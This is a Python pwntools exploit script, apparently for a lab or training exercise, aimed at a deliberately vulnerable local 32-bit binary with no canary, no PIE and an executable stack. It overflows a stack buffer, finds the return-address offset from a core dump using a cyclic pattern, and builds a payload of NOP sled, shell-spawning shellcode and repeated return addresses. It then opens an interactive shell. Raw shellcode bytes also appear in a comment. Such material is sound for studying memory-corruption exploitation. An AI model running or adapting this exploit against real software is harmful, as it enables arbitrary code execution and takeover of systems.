#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln_cpp.exe
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'vuln.exe')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x8048000)
# Stack:      Executable
# RWX:        Has RWX segments
# Stripped:   No
# Debuginfo:  Yes

# find the address of the buffer
arg_len = 120
payload = b"A"*arg_len
argv = [payload]
io = start(argv)
output = io.recvline()
# receive the same ouput as the argument sent
print(f'{output=}')
assert output.decode('utf-8').strip() == payload.decode('utf-8')

# find the address from the output; !! not realistic!!
# NOTE buffer address captrued using this technique is also not reliable as it shifts based on
# the size of the argument passed to main!
label = io.recvuntil(b' at ')
#output1 = io.recvline()
#print(f'{output1=}')
buf_address = int(io.recvline().decode('utf-8').strip(), base=16)
print(f'{label}: {buf_address:#010x}')

# crash the program using cyclic pattern and find the offset and address of buffer; realistic!
# this is a reliable technique as it shows
pattern = cyclic(arg_len, n=4)
argv = [pattern]
io = start(argv)
io.wait()
core = io.corefile
offset = cyclic_find(core.eip, n=4)

print(f'ESP is at {core.esp:#010x}')
print(f'EIP contains {core.eip:#010x}')
print(f'Offset to EIP from buffer add: {offset}')

buf_address1 = core.esp-(offset+4)

print(f'{buf_address1=:#010x}')
repeat_ret_address = p32(buf_address1)*5

# get the shellcode using pwntools
#shellcode_user = asm(shellcraft.sh())
shellcode_user = asm(shellcraft.i386.linux.sh())

print(hexdump(shellcode_user))
# x86/linux/exec: 24 bytes; copied from shellcode/x86-linux-sh.py file
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

#shellcode_user = (
#    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
#    b"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
#)

sled_len = offset+4 - len(repeat_ret_address)-len(shellcode_user)
NOPSled = b'\x90'*sled_len  # asm('nop')
payload = NOPSled + shellcode_user + repeat_ret_address
payload += b"A"*(arg_len - len(payload))

# Final io tube with the same argv as the one that crashed and created core file
io = start([payload])

# Interact with the shell
io.interactive()

